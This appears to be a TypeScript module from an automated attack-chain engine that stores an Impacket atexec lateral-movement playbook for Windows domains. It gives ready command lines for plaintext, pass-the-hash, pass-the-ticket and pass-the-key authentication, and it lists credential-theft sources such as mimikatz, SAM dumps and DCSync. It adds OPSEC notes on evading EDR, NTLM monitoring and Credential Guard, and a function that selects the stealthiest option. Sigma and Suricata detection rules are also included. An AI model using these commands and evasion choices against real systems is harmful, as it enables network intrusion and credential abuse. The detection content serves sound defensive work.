/**
 * Impacket atexec Playbook — Lateral Movement via Windows Task Scheduler (ATSVC)
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * atexec.py leverages the Windows Task Scheduler service (ATSVC named pipe over MSRPC)
 * to execute commands on remote systems. Unlike psexec (service creation) or wmiexec (WMI),
 * atexec uses scheduled tasks as the execution channel, bypassing detections that
 * specifically monitor service creation or WMI activity.
 *
 * MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)
 * Kill Chain Phase: Lateral Movement / Execution
 * 
 * Authentication Methods:
 *   1. Plaintext credentials (username:password)
 *   2. Pass-the-Hash (NTLM hash)
 *   3. Pass-the-Ticket (Kerberos .ccache)
 *   4. Pass-the-Key (AES256/AES128 key)
 *
 * Source: https://www.hackingarticles.in/impacket-for-pentester-atexec/
 * Tool: https://github.com/fortra/impacket/blob/master/examples/atexec.py
 *
 * @module impacket-atexec-playbook
 */

import type { ExploitDocument } from "./exploit-knowledge-store";

// ─── Playbook Entry Types ────────────────────────────────────────────────────

export interface AtexecPlaybookEntry {
  id: string;
  authMethod: "plaintext" | "pass_the_hash" | "pass_the_ticket" | "pass_the_key";
  name: string;
  description: string;
  command: string;
  prerequisites: string[];
  detectionRisk: "low" | "medium" | "high";
  stealthNotes: string;
  /** Example command line invocation */
  exampleCommand: string;
  /** Indicators of Compromise generated */
  iocs: AtexecIOC[];
  /** OPSEC considerations */
  opsec: string[];
  /** When to prefer this over psexec/wmiexec */
  preferWhen: string[];
  /** Known limitations */
  limitations: string[];
}

export interface AtexecIOC {
  type: "event_log" | "network" | "filesystem" | "registry";
  description: string;
  indicator: string;
  detectionConfidence: "high" | "medium" | "low";
}

export interface AtexecDetectionRule {
  id: string;
  name: string;
  description: string;
  type: "sigma" | "suricata" | "yara";
  rule: string;
  coverage: string[];
  falsePositiveRate: "low" | "medium" | "high";
  references: string[];
}

export interface AtexecValidationCheck {
  id: string;
  name: string;
  description: string;
  /** What state change confirms successful execution */
  successIndicator: string;
  /** How to capture evidence */
  evidenceCollection: string;
  /** Confidence level if this check passes */
  confidence: number;
}

// ─── Exploit Knowledge Store Documents ───────────────────────────────────────

export const ATEXEC_EXPLOIT_DOCUMENTS: ExploitDocument[] = [
  {
    id: "ac3-impacket-atexec-plaintext",
    source: "custom",
    cveIds: [],
    title: "Impacket atexec — Lateral Movement via Task Scheduler (Plaintext Auth)",
    description: "Execute commands on remote Windows systems using the ATSVC MSRPC interface (Task Scheduler). Uses plaintext domain credentials. Creates a temporary scheduled task, executes the command, captures output via ADMIN$ share temp file, then self-cleans. Bypasses service-creation monitoring (psexec) and WMI monitoring (wmiexec).",
    code: `#!/usr/bin/env python3
"""
Impacket atexec - Lateral Movement via Task Scheduler (Plaintext)
MITRE ATT&CK: T1053.005
Prerequisites: Valid domain credentials, SMB access to target (445/TCP), ADMIN$ share accessible
"""
# Usage: atexec.py [[domain/]username[:password]@]<targetName or address> "command"
# Example: atexec.py DOMAIN/user:Password123@192.168.1.100 "whoami"

from impacket.examples import atexec
import sys

# Standard invocation
# atexec.py ignite.local/Administrator:Ignite@987@192.168.1.105 "whoami"
# atexec.py ignite.local/Administrator:Ignite@987@192.168.1.105 "ipconfig"
# atexec.py ignite.local/Administrator:Ignite@987@192.168.1.105 "net user"

# The tool:
# 1. Connects to target via MSRPC (ncacn_np transport over SMB)
# 2. Binds to ATSVC interface (Task Scheduler)
# 3. Creates a scheduled task with random name
# 4. Task executes: cmd.exe /C "command > %TEMP%/random.tmp 2>&1"
# 5. Reads output from ADMIN$ share (C:\\Windows\\Temp\\random.tmp)
# 6. Deletes the task and temp file
`,
    language: "python",
    platform: "windows",
    service: "smb",
    exploitType: "lateral_movement",
    author: "Fortra (SecureAuth) / Impacket",
    datePublished: "2023-01-01",
    sourceUrl: "https://github.com/fortra/impacket/blob/master/examples/atexec.py",
    reliabilityScore: 95,
    tags: ["impacket", "atexec", "lateral-movement", "scheduled-task", "T1053.005", "atsvc", "msrpc", "plaintext", "windows", "active-directory"],
  },
  {
    id: "ac3-impacket-atexec-pth",
    source: "custom",
    cveIds: [],
    title: "Impacket atexec — Lateral Movement via Task Scheduler (Pass-the-Hash)",
    description: "Execute commands on remote Windows systems using ATSVC with NTLM hash authentication (Pass-the-Hash). Does not require knowledge of the plaintext password — only the NT hash. Ideal when credentials are harvested via SAM dump, LSASS extraction, or DCSync.",
    code: `#!/usr/bin/env python3
"""
Impacket atexec - Lateral Movement via Task Scheduler (Pass-the-Hash)
MITRE ATT&CK: T1053.005 + T1550.002 (Use Alternate Authentication Material: Pass the Hash)
Prerequisites: NTLM hash of privileged account, SMB access to target (445/TCP)
"""
# Usage: atexec.py -hashes [LMhash]:NThash [[domain/]username@]<targetName or address> "command"
# Example: atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105 "whoami"

# The -hashes flag accepts LM:NT format
# LM hash can be empty (aad3b435b51404eeaad3b435b51404ee = empty LM)
# Only the NT hash portion is actually used for authentication

# Common hash sources:
# - SAM database dump (reg save HKLM\\SAM)
# - LSASS memory extraction (mimikatz sekurlsa::logonpasswords)
# - DCSync (secretsdump.py)
# - NTDS.dit extraction
`,
    language: "python",
    platform: "windows",
    service: "smb",
    exploitType: "lateral_movement",
    author: "Fortra (SecureAuth) / Impacket",
    datePublished: "2023-01-01",
    sourceUrl: "https://github.com/fortra/impacket/blob/master/examples/atexec.py",
    reliabilityScore: 95,
    tags: ["impacket", "atexec", "lateral-movement", "scheduled-task", "T1053.005", "T1550.002", "pass-the-hash", "pth", "ntlm", "windows", "active-directory"],
  },
  {
    id: "ac3-impacket-atexec-ptt",
    source: "custom",
    cveIds: [],
    title: "Impacket atexec — Lateral Movement via Task Scheduler (Pass-the-Ticket / Kerberos)",
    description: "Execute commands on remote Windows systems using ATSVC with Kerberos ticket authentication (Pass-the-Ticket). Uses a .ccache file containing a valid TGT or service ticket. Avoids NTLM authentication entirely, making it harder to detect via NTLM-focused monitoring. Requires -k flag and KRB5CCNAME environment variable.",
    code: `#!/usr/bin/env python3
"""
Impacket atexec - Lateral Movement via Task Scheduler (Pass-the-Ticket)
MITRE ATT&CK: T1053.005 + T1550.003 (Use Alternate Authentication Material: Pass the Ticket)
Prerequisites: Valid Kerberos TGT/TGS in .ccache format, DNS resolution to target
"""
# Step 1: Set the Kerberos credential cache
# export KRB5CCNAME=/path/to/ticket.ccache

# Step 2: Execute with -k (Kerberos) and -no-pass flags
# atexec.py -k -no-pass -dc-ip 192.168.1.100 ignite.local/Administrator@DC01.ignite.local "whoami"

# Notes:
# - Target MUST be specified by FQDN (not IP) for Kerberos SPN resolution
# - The .ccache file can be obtained via:
#   - Rubeus dump (converted from .kirbi to .ccache via ticketConverter.py)
#   - getTGT.py with credentials or keytab
#   - Unconstrained delegation abuse
#   - PKINIT certificate-based auth

# Kerberos-only auth avoids:
# - NTLM relay detection
# - NTLM audit logging (Event ID 4776)
# - Credential Guard NTLM restrictions
`,
    language: "python",
    platform: "windows",
    service: "smb",
    exploitType: "lateral_movement",
    author: "Fortra (SecureAuth) / Impacket",
    datePublished: "2023-01-01",
    sourceUrl: "https://github.com/fortra/impacket/blob/master/examples/atexec.py",
    reliabilityScore: 90,
    tags: ["impacket", "atexec", "lateral-movement", "scheduled-task", "T1053.005", "T1550.003", "pass-the-ticket", "ptt", "kerberos", "ccache", "windows", "active-directory"],
  },
  {
    id: "ac3-impacket-atexec-ptk",
    source: "custom",
    cveIds: [],
    title: "Impacket atexec — Lateral Movement via Task Scheduler (Pass-the-Key / Overpass-the-Hash)",
    description: "Execute commands on remote Windows systems using ATSVC with AES key authentication (Pass-the-Key / Overpass-the-Hash). Uses the AES256 or AES128 Kerberos key to request a TGT, then authenticates via Kerberos. Most stealthy variant — avoids both NTLM and plaintext credential exposure on the wire.",
    code: `#!/usr/bin/env python3
"""
Impacket atexec - Lateral Movement via Task Scheduler (Pass-the-Key)
MITRE ATT&CK: T1053.005 + T1550.002 (Overpass-the-Hash via AES key)
Prerequisites: AES256 or AES128 Kerberos key of privileged account
"""
# Usage with AES256 key:
# atexec.py -k -aesKey <AES256_KEY> -dc-ip 192.168.1.100 ignite.local/Administrator@DC01.ignite.local "whoami"

# Usage with AES128 key:
# atexec.py -k -aesKey <AES128_KEY> -dc-ip 192.168.1.100 ignite.local/Administrator@DC01.ignite.local "whoami"

# AES keys can be obtained from:
# - DCSync (secretsdump.py -just-dc-user Administrator)
# - NTDS.dit extraction with key material
# - Mimikatz sekurlsa::ekeys
# - Kerberos keytab files

# This is the stealthiest variant because:
# 1. No NTLM hash on the wire (bypasses NTLM monitoring)
# 2. No plaintext password (bypasses credential sniffing)
# 3. Uses legitimate Kerberos flow (harder to distinguish from normal auth)
# 4. AES encryption is the "expected" modern Kerberos cipher
`,
    language: "python",
    platform: "windows",
    service: "smb",
    exploitType: "lateral_movement",
    author: "Fortra (SecureAuth) / Impacket",
    datePublished: "2023-01-01",
    sourceUrl: "https://github.com/fortra/impacket/blob/master/examples/atexec.py",
    reliabilityScore: 90,
    tags: ["impacket", "atexec", "lateral-movement", "scheduled-task", "T1053.005", "T1550.002", "pass-the-key", "ptk", "overpass-the-hash", "aes", "kerberos", "windows", "active-directory"],
  },
];

// ─── Playbook Entries (Operational Detail) ───────────────────────────────────

export const ATEXEC_PLAYBOOK_ENTRIES: AtexecPlaybookEntry[] = [
  {
    id: "atexec-plaintext",
    authMethod: "plaintext",
    name: "atexec Plaintext Authentication",
    description: "Standard lateral movement using domain username and password via Task Scheduler RPC",
    command: 'atexec.py DOMAIN/user:password@TARGET "command"',
    prerequisites: [
      "Valid domain credentials (username + password)",
      "Network access to target port 445/TCP (SMB)",
      "ADMIN$ share accessible on target",
      "Target Windows Task Scheduler service running",
      "User must have local admin rights on target",
    ],
    detectionRisk: "medium",
    stealthNotes: "Creates and immediately deletes a scheduled task. Output captured via temp file on ADMIN$ share. Task name is randomized. Less noisy than psexec (no service installation) but creates Event ID 4698/4699.",
    exampleCommand: 'atexec.py ignite.local/Administrator:Ignite@987@192.168.1.105 "whoami"',
    iocs: [
      { type: "event_log", description: "Scheduled task creation", indicator: "Event ID 4698 (Task Created)", detectionConfidence: "high" },
      { type: "event_log", description: "Scheduled task deletion", indicator: "Event ID 4699 (Task Deleted)", detectionConfidence: "high" },
      { type: "filesystem", description: "Temp output file on ADMIN$ share", indicator: "C:\\Windows\\Temp\\<random>.tmp", detectionConfidence: "medium" },
      { type: "network", description: "SMB connection to ADMIN$ share", indicator: "TCP 445 + ATSVC named pipe binding", detectionConfidence: "medium" },
      { type: "network", description: "MSRPC ATSVC interface binding", indicator: "\\PIPE\\atsvc (UUID 1FF70682-0A51-30E8-076D-740BE8CEE98B)", detectionConfidence: "high" },
    ],
    opsec: [
      "Task is created and deleted within seconds — short-lived artifact",
      "Output file is written then immediately read and deleted",
      "No persistent service installed (unlike psexec)",
      "No WMI event subscription created (unlike wmiexec)",
      "Authentication appears as standard SMB logon",
    ],
    preferWhen: [
      "Target EDR monitors service creation (blocks psexec)",
      "WMI event subscription monitoring is active (blocks wmiexec)",
      "Need command output returned (unlike some C2 exec methods)",
      "Want minimal forensic footprint on target",
      "psexec/smbexec are signature-blocked by AV",
    ],
    limitations: [
      "Requires ADMIN$ share access (local admin on target)",
      "Creates brief Event ID 4698/4699 entries (detectable with proper logging)",
      "Single command execution per invocation (not interactive shell)",
      "Output limited to what fits in temp file",
      "Requires Task Scheduler service running (default on Windows)",
    ],
  },
  {
    id: "atexec-pth",
    authMethod: "pass_the_hash",
    name: "atexec Pass-the-Hash",
    description: "Lateral movement using NTLM hash without knowing the plaintext password. Ideal post-credential-dump.",
    command: 'atexec.py -hashes LMhash:NThash DOMAIN/user@TARGET "command"',
    prerequisites: [
      "NTLM hash of privileged account (NT portion required)",
      "Network access to target port 445/TCP (SMB)",
      "ADMIN$ share accessible on target",
      "NTLM authentication not disabled on target (no Kerberos-only policy)",
    ],
    detectionRisk: "medium",
    stealthNotes: "Same execution profile as plaintext but uses NTLM hash for auth. May trigger NTLM audit events (4776) on DC. Credential Guard does NOT block this if hash was obtained from another source.",
    exampleCommand: 'atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105 "whoami"',
    iocs: [
      { type: "event_log", description: "Scheduled task creation", indicator: "Event ID 4698 (Task Created)", detectionConfidence: "high" },
      { type: "event_log", description: "Scheduled task deletion", indicator: "Event ID 4699 (Task Deleted)", detectionConfidence: "high" },
      { type: "event_log", description: "NTLM authentication event", indicator: "Event ID 4776 on DC (NTLM validation)", detectionConfidence: "medium" },
      { type: "network", description: "NTLM authentication in SMB session", indicator: "NTLMSSP_AUTH in SMB2 Session Setup", detectionConfidence: "medium" },
      { type: "filesystem", description: "Temp output file", indicator: "C:\\Windows\\Temp\\<random>.tmp", detectionConfidence: "medium" },
    ],
    opsec: [
      "LM hash portion can be empty (aad3b435b51404eeaad3b435b51404ee)",
      "Only NT hash is used for actual authentication",
      "Does not require plaintext password recovery",
      "NTLM relay protections (signing) do not affect this — direct auth",
      "Credential Guard on target does not prevent PtH from external source",
    ],
    preferWhen: [
      "Only have NTLM hash (no plaintext password available)",
      "Post-SAM dump or LSASS extraction",
      "Post-DCSync where only hashes were retrieved",
      "Kerberos infrastructure unavailable or untrusted",
    ],
    limitations: [
      "Blocked if target enforces Kerberos-only authentication",
      "Generates NTLM audit events on Domain Controller",
      "Windows Defender Credential Guard may prevent hash extraction (but not use)",
      "Some EDR correlate rapid 4776 + 4698 sequences",
    ],
  },
  {
    id: "atexec-ptt",
    authMethod: "pass_the_ticket",
    name: "atexec Pass-the-Ticket (Kerberos)",
    description: "Lateral movement using stolen Kerberos tickets (.ccache). Avoids NTLM entirely — uses pure Kerberos authentication flow.",
    command: 'export KRB5CCNAME=/path/to/ticket.ccache && atexec.py -k -no-pass DOMAIN/user@TARGET.domain.local "command"',
    prerequisites: [
      "Valid Kerberos TGT or service ticket in .ccache format",
      "KRB5CCNAME environment variable set to .ccache path",
      "DNS resolution working for target FQDN (Kerberos requires FQDN)",
      "Target specified by FQDN (not IP address)",
      "Ticket not expired (check with klist)",
    ],
    detectionRisk: "low",
    stealthNotes: "Most evasive network-level variant. No NTLM on the wire means no Event ID 4776 on DC. Kerberos auth blends with normal domain traffic. Only task creation/deletion events remain as indicators.",
    exampleCommand: 'export KRB5CCNAME=/tmp/admin.ccache && atexec.py -k -no-pass -dc-ip 192.168.1.100 ignite.local/Administrator@DC01.ignite.local "whoami"',
    iocs: [
      { type: "event_log", description: "Scheduled task creation", indicator: "Event ID 4698 (Task Created)", detectionConfidence: "high" },
      { type: "event_log", description: "Scheduled task deletion", indicator: "Event ID 4699 (Task Deleted)", detectionConfidence: "high" },
      { type: "event_log", description: "Kerberos service ticket request", indicator: "Event ID 4769 (TGS request for CIFS/target)", detectionConfidence: "low" },
      { type: "network", description: "Kerberos AP-REQ in SMB session", indicator: "Kerberos auth in SMB2 (no NTLMSSP)", detectionConfidence: "low" },
    ],
    opsec: [
      "No NTLM traffic generated — bypasses NTLM monitoring entirely",
      "Kerberos auth is indistinguishable from legitimate domain auth at network level",
      "No credential material exposed on wire (ticket is encrypted)",
      "Bypasses Credential Guard NTLM restrictions",
      "Works even when NTLM is disabled via GPO",
    ],
    preferWhen: [
      "Target environment monitors/blocks NTLM authentication",
      "Credential Guard is deployed (prevents NTLM PtH)",
      "Have valid Kerberos tickets from delegation abuse or Rubeus",
      "Need to avoid NTLM audit trail on DC",
      "Operating in environment with Kerberos-only policy",
    ],
    limitations: [
      "Requires FQDN (IP-based targeting fails with Kerberos)",
      "Ticket expiration limits operational window (default 10h TGT)",
      "DNS must resolve correctly for SPN matching",
      "Requires .ccache format (convert .kirbi with ticketConverter.py)",
      "Clock skew > 5 minutes causes Kerberos failures",
    ],
  },
  {
    id: "atexec-ptk",
    authMethod: "pass_the_key",
    name: "atexec Pass-the-Key (AES / Overpass-the-Hash)",
    description: "Lateral movement using AES256/AES128 Kerberos keys. Requests a fresh TGT using the AES key, then authenticates via Kerberos. Most stealthy — no NTLM, no plaintext, uses modern encryption.",
    command: 'atexec.py -k -aesKey <AES256_KEY> -dc-ip DC_IP DOMAIN/user@TARGET.domain.local "command"',
    prerequisites: [
      "AES256 or AES128 Kerberos key of target account",
      "Network access to DC (port 88/TCP for TGT request)",
      "Network access to target (port 445/TCP for SMB)",
      "DNS resolution for target FQDN",
      "DC IP specified with -dc-ip flag",
    ],
    detectionRisk: "low",
    stealthNotes: "Stealthiest variant. Uses AES (the expected modern cipher) for Kerberos auth. No NTLM, no RC4 (which some detections flag as anomalous). The TGT request looks like a normal Kerberos AS-REQ with AES encryption.",
    exampleCommand: 'atexec.py -k -aesKey 5c7ee0b8f0ffeedbeefdeadbeef1234567890abcdef1234567890abcdef123456 -dc-ip 192.168.1.100 ignite.local/Administrator@DC01.ignite.local "whoami"',
    iocs: [
      { type: "event_log", description: "Scheduled task creation", indicator: "Event ID 4698 (Task Created)", detectionConfidence: "high" },
      { type: "event_log", description: "Scheduled task deletion", indicator: "Event ID 4699 (Task Deleted)", detectionConfidence: "high" },
      { type: "event_log", description: "Kerberos TGT request", indicator: "Event ID 4768 (AS-REQ with AES256 encryption)", detectionConfidence: "low" },
      { type: "event_log", description: "Kerberos service ticket", indicator: "Event ID 4769 (TGS for CIFS/target)", detectionConfidence: "low" },
    ],
    opsec: [
      "AES256 is the expected/default Kerberos cipher — does not trigger RC4 anomaly detections",
      "No NTLM traffic or audit events",
      "Fresh TGT requested — not reusing potentially monitored tickets",
      "Indistinguishable from legitimate Kerberos auth at network level",
      "No credential material in plaintext at any point",
    ],
    preferWhen: [
      "Have AES keys from DCSync or keytab extraction",
      "Environment flags RC4 Kerberos as anomalous (detects standard overpass-the-hash)",
      "Maximum stealth required — avoid all non-standard auth patterns",
      "Operating against mature SOC with Kerberos monitoring",
      "Need to blend perfectly with normal domain authentication",
    ],
    limitations: [
      "AES keys harder to obtain than NTLM hashes (requires DCSync or NTDS.dit + bootkey)",
      "Requires network path to DC for TGT request",
      "Same FQDN/DNS/clock-skew requirements as Pass-the-Ticket",
      "If DC is unreachable, cannot obtain TGT",
    ],
  },
];

// ─── Detection Rules ─────────────────────────────────────────────────────────

export const ATEXEC_DETECTION_RULES: AtexecDetectionRule[] = [
  {
    id: "sigma-atexec-task-lifecycle",
    name: "Rapid Scheduled Task Create-Delete (atexec Pattern)",
    description: "Detects the characteristic pattern of atexec: a scheduled task created and deleted within seconds, with command output redirected to a temp file.",
    type: "sigma",
    rule: `title: Rapid Scheduled Task Create-Delete (Impacket atexec Pattern)
id: ac3-detect-atexec-001
status: production
level: high
description: |
  Detects the characteristic execution pattern of Impacket's atexec.py tool.
  atexec creates a scheduled task, executes a command with output redirected to
  a temp file in C:\\Windows\\Temp\\, then immediately deletes the task.
  The rapid create-delete cycle (< 30 seconds) is highly indicative of atexec.
author: AC3 Detection Engine
date: ${new Date().toISOString().split('T')[0]}
references:
  - https://github.com/fortra/impacket/blob/master/examples/atexec.py
  - https://attack.mitre.org/techniques/T1053/005/
tags:
  - attack.lateral_movement
  - attack.execution
  - attack.t1053.005
  - tool.impacket
  - tool.atexec
logsource:
  product: windows
  service: security
detection:
  task_created:
    EventID: 4698
  task_deleted:
    EventID: 4699
  timeframe: 30s
  condition: task_created | near task_deleted
  filter:
    TaskName|contains:
      - 'Microsoft'
      - 'GoogleUpdate'
      - 'Adobe'
falsepositives:
  - Legitimate admin scripts that create and immediately delete tasks
  - SCCM/MECM task sequences (usually longer-lived)
level: high`,
    coverage: ["T1053.005", "lateral_movement", "execution"],
    falsePositiveRate: "low",
    references: ["https://github.com/fortra/impacket/blob/master/examples/atexec.py"],
  },
  {
    id: "sigma-atexec-temp-output",
    name: "Command Output to Windows Temp via Task Scheduler",
    description: "Detects cmd.exe execution with output redirected to C:\\Windows\\Temp\\*.tmp, characteristic of atexec output capture.",
    type: "sigma",
    rule: `title: Task Scheduler Command Output Redirect to Temp (atexec Indicator)
id: ac3-detect-atexec-002
status: production
level: medium
description: |
  Detects process creation where cmd.exe is spawned by the Task Scheduler
  service with output redirected to a .tmp file in C:\\Windows\\Temp\\.
  This is the output capture mechanism used by Impacket atexec.
author: AC3 Detection Engine
date: ${new Date().toISOString().split('T')[0]}
references:
  - https://github.com/fortra/impacket/blob/master/examples/atexec.py
tags:
  - attack.execution
  - attack.t1053.005
  - tool.impacket
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\\svchost.exe'
    ParentCommandLine|contains: 'Schedule'
    Image|endswith: '\\cmd.exe'
    CommandLine|contains:
      - '> C:\\Windows\\Temp\\'
      - '> %windir%\\Temp\\'
      - '2>&1'
  condition: selection
falsepositives:
  - Legitimate scheduled tasks that redirect output to temp files
level: medium`,
    coverage: ["T1053.005", "execution"],
    falsePositiveRate: "medium",
    references: ["https://github.com/fortra/impacket/blob/master/examples/atexec.py"],
  },
  {
    id: "suricata-atsvc-pipe",
    name: "ATSVC Named Pipe Access (Task Scheduler RPC)",
    description: "Detects SMB access to the \\PIPE\\atsvc named pipe, which is the MSRPC endpoint for the Task Scheduler service used by atexec.",
    type: "suricata",
    rule: `alert smb any any -> $HOME_NET 445 (
  msg:"AC3 - ATSVC Named Pipe Access (Potential atexec/Lateral Movement)";
  flow:to_server,established;
  content:"|FF|SMB";
  content:"\\PIPE\\atsvc";
  reference:url,attack.mitre.org/techniques/T1053/005/;
  reference:url,github.com/fortra/impacket/blob/master/examples/atexec.py;
  classtype:lateral-movement;
  sid:3000001;
  rev:1;
  metadata:mitre_attack T1053.005, tool impacket_atexec;
)`,
    coverage: ["T1053.005", "lateral_movement", "network"],
    falsePositiveRate: "low",
    references: ["https://github.com/fortra/impacket/blob/master/examples/atexec.py"],
  },
  {
    id: "sigma-atexec-admin-share-temp",
    name: "ADMIN$ Share Temp File Write-Read-Delete (atexec Output)",
    description: "Detects the file lifecycle pattern on ADMIN$ share: write .tmp file, read it, then delete — characteristic of atexec output retrieval.",
    type: "sigma",
    rule: `title: ADMIN$ Share Temp File Rapid Write-Read-Delete (atexec Output Pattern)
id: ac3-detect-atexec-003
status: production
level: medium
description: |
  Detects rapid file creation, access, and deletion in the Windows\\Temp
  directory accessed via ADMIN$ share. This pattern matches atexec's
  output retrieval mechanism.
author: AC3 Detection Engine
date: ${new Date().toISOString().split('T')[0]}
references:
  - https://github.com/fortra/impacket/blob/master/examples/atexec.py
tags:
  - attack.lateral_movement
  - attack.t1053.005
  - tool.impacket
logsource:
  product: windows
  service: security
detection:
  file_created:
    EventID: 5145
    ShareName: '\\\\*\\ADMIN$'
    RelativeTargetName|contains: 'Temp\\'
    RelativeTargetName|endswith: '.tmp'
    AccessMask: '0x2'
  file_read:
    EventID: 5145
    ShareName: '\\\\*\\ADMIN$'
    RelativeTargetName|contains: 'Temp\\'
    RelativeTargetName|endswith: '.tmp'
    AccessMask: '0x1'
  timeframe: 60s
  condition: file_created | near file_read
falsepositives:
  - Remote administration tools writing logs to ADMIN$ temp
  - SCCM client operations
level: medium`,
    coverage: ["T1053.005", "lateral_movement", "filesystem"],
    falsePositiveRate: "medium",
    references: ["https://github.com/fortra/impacket/blob/master/examples/atexec.py"],
  },
];

// ─── Validation Checks ───────────────────────────────────────────────────────

export const ATEXEC_VALIDATION_CHECKS: AtexecValidationCheck[] = [
  {
    id: "atexec-val-task-created",
    name: "Scheduled Task Creation Confirmed",
    description: "Verify that a new scheduled task appeared on the target system (Event ID 4698)",
    successIndicator: "Event ID 4698 logged with task name matching random pattern and cmd.exe /C command",
    evidenceCollection: "Query Windows Security Event Log for Event ID 4698 within execution window; capture full event XML",
    confidence: 90,
  },
  {
    id: "atexec-val-task-deleted",
    name: "Scheduled Task Self-Cleanup Confirmed",
    description: "Verify that the task was deleted after execution (Event ID 4699), confirming the full atexec lifecycle",
    successIndicator: "Event ID 4699 logged for the same task name within 30 seconds of creation",
    evidenceCollection: "Correlate 4698 and 4699 events by TaskName; measure time delta",
    confidence: 85,
  },
  {
    id: "atexec-val-command-output",
    name: "Command Output Retrieved",
    description: "Verify that command output was successfully captured from the ADMIN$ temp file",
    successIndicator: "Non-empty output returned matching expected command result (e.g., whoami returns domain\\user)",
    evidenceCollection: "Capture the returned output text; verify it matches expected format for the executed command",
    confidence: 95,
  },
  {
    id: "atexec-val-temp-file-lifecycle",
    name: "Temp File Write-Read-Delete Cycle",
    description: "Verify the temp file was created, read, and deleted on the ADMIN$ share",
    successIndicator: "File audit events (5145) show create → read → delete for .tmp file in Windows\\Temp",
    evidenceCollection: "Monitor ADMIN$ share access events; capture file path and access timestamps",
    confidence: 80,
  },
  {
    id: "atexec-val-no-service-created",
    name: "No Service Installation (Stealth Confirmation)",
    description: "Confirm that no Windows service was created (differentiates from psexec)",
    successIndicator: "No Event ID 7045 (new service) or 4697 (service installed) during execution window",
    evidenceCollection: "Query System and Security event logs for service creation events; absence confirms atexec over psexec",
    confidence: 70,
  },
];

// ─── Chain Synthesis Integration ─────────────────────────────────────────────

/**
 * Determines when atexec should be preferred over other lateral movement tools
 * in the attack chain synthesis engine.
 */
export function shouldPreferAtexec(context: {
  targetHasEDR: boolean;
  edrBlocksServiceCreation: boolean;
  wmiMonitored: boolean;
  ntlmRestricted: boolean;
  hasKerberosTickets: boolean;
  hasNtlmHash: boolean;
  hasPlaintextCreds: boolean;
  hasAesKeys: boolean;
  targetOs: string;
}): { preferred: boolean; authMethod: string; reason: string } {
  // atexec only works on Windows
  if (!context.targetOs.toLowerCase().includes("windows")) {
    return { preferred: false, authMethod: "", reason: "atexec requires Windows target (Task Scheduler)" };
  }

  // Strong preference: EDR blocks service creation (psexec blocked)
  if (context.edrBlocksServiceCreation) {
    if (context.hasAesKeys) return { preferred: true, authMethod: "pass_the_key", reason: "EDR blocks psexec service creation; using atexec with AES key for maximum stealth" };
    if (context.hasKerberosTickets) return { preferred: true, authMethod: "pass_the_ticket", reason: "EDR blocks psexec; using atexec with Kerberos ticket (no NTLM)" };
    if (context.hasNtlmHash) return { preferred: true, authMethod: "pass_the_hash", reason: "EDR blocks psexec service creation; using atexec with NTLM hash" };
    if (context.hasPlaintextCreds) return { preferred: true, authMethod: "plaintext", reason: "EDR blocks psexec; using atexec with plaintext credentials" };
  }

  // Strong preference: WMI is monitored (wmiexec blocked)
  if (context.wmiMonitored && context.edrBlocksServiceCreation) {
    if (context.hasAesKeys) return { preferred: true, authMethod: "pass_the_key", reason: "Both psexec and wmiexec blocked; atexec via AES key is the remaining option" };
    if (context.hasKerberosTickets) return { preferred: true, authMethod: "pass_the_ticket", reason: "psexec and wmiexec blocked; atexec via Kerberos" };
    return { preferred: true, authMethod: context.hasNtlmHash ? "pass_the_hash" : "plaintext", reason: "psexec and wmiexec blocked; atexec is the fallback lateral movement method" };
  }

  // Preference: NTLM restricted (use Kerberos variants)
  if (context.ntlmRestricted) {
    if (context.hasAesKeys) return { preferred: true, authMethod: "pass_the_key", reason: "NTLM restricted; atexec with AES key uses pure Kerberos" };
    if (context.hasKerberosTickets) return { preferred: true, authMethod: "pass_the_ticket", reason: "NTLM restricted; atexec with Kerberos ticket" };
  }

  // Default: not strongly preferred, but available as alternative
  return { preferred: false, authMethod: "", reason: "Other lateral movement methods available and not blocked" };
}

/**
 * Registers atexec documents into the exploit knowledge store on initialization.
 */
export function seedAtexecPlaybook(addDocument: (doc: ExploitDocument) => void): number {
  let count = 0;
  for (const doc of ATEXEC_EXPLOIT_DOCUMENTS) {
    addDocument(doc);
    count++;
  }
  console.log(`[ExploitKnowledgeStore] Seeded ${count} Impacket atexec playbook entries`);
  return count;
}
